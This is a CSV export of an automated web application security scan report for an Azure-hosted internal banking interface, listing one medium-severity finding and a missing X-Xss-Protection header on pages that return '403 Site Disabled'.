"Web Application Report","22 Feb 2024 11:26AM GMT+0530"
"Fint solutions","Near sky view building","Hyd","Andhra Pradesh","500081","India"
"Dixith Thirukkovalluru","fntsu8dt",""
"DESCRIPTION"
"Each targeted web application is listed with the total number of detected vulnerabilities and sensitive content."
"TARGET"
"Web Applications","fint-int-digitalbankingui-nra.azurewebsites"
"FILTERS"
"Status","New,Active,Re-Opened"
"Remediation","Do not show ignored findings, Include patched findings"
"Detection Source","QUALYS,BURP,BUGCROWD"
"SUMMARY"
"Security Risk","Web Applications","Vulnerabilities","Sensitive Contents","Information Gathered"
"Medium","1","1","0","26"
"Web Application","Level 5","Level 4","Level 3","Level 2","Level 1","Sensitive Contents","Information Gathered"
"fint-int-digitalbankingui-nra.azurewebsites","0","0","1","0","0","0","26"
"RESULTS"
"Web Application Name","VULNERABILITY","ID","QID","Url","Param","Function","Form Entry Point","Access Path","Authentication","Ajax Request","Ajax Request ID","Status","Ignored","Ignore Reason","Ignore Date","Ignore User","Ignore Comments","First Time Detected","Last Time Detected","Last Time Tested","Times Detected","Payload #1","Request Method #1","Request URL #1","Request Headers #1","Response #1","Evidence #1","Unique ID","Request Body #1","Flags","Protocol","Virtual Host","IP","Port","Result","Info#1","CVSS V3 Base","CVSS V3 Temporal","CVSS V3 Attack Vector","Potential"
"fint-int-digitalbankingui-nra.azurewebsites","VULNERABILITY","7068410","150263","http://fint-int-digitalbankingui-nra.azurewebsites.net/","","","","","Not Required","No","","Active","No","","","","","15 Feb 2024 10:16PM GMT+0530","16 Feb 2024 12:08AM GMT+0530","16 Feb 2024 12:08AM GMT+0530","2","","GET","http://fint-int-digitalbankingui-nra.azurewebsites.net/","Referer: https://fint-int-digitalbankingui-nra.azurewebsites.net/Host: fint-int-digitalbankingui-nra.azurewebsites.netUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.177 Safari/537.36Accept: */*","HTTP/1.1 403 Site Disabled
Content-Length: 2342
Connection: close
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:33 GMT

<!DOCTYPE html>
<html>
<head>
    <title>Web App - Unavailable</title>
    <style type=""text/css"">
        html {
            height: 100%;
            width: 100%;
        }

        #feature {
            width: 960px;
            margin: 95px auto 0 auto;
            overflow: auto;
        }

        #content {
            font-family: ""Segoe UI"";
            font-weight: normal;
            font-size: 22px;
            color: #ffffff;
            float: left;
         ","","ef44c386-2881-46e0-a598-702d8ff3affb","","","","","","","","","7.6","6.6","Network","false"
"Web Application Name","INFORMATION GATHERED","ID","QID","Results","Detection Date","Unique ID","Flags","Protocol","Virtual Host","IP","Port","Result","Info#1"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261575","150204","
X-Xss-Protection: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","14d77f0f-b32f-480b-a00a-7524afa461f6","","","","","","",""
